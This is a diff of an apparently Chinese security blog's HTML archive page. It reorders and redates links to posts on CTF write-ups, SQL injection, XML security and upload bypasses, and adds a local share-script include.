+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/xss-ssrf-redis/" >xss->ssrf->redis</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
         </li>
     
     
@@ -3049,12 +3214,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
         </li>
     
     
@@ -3609,6 +3774,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
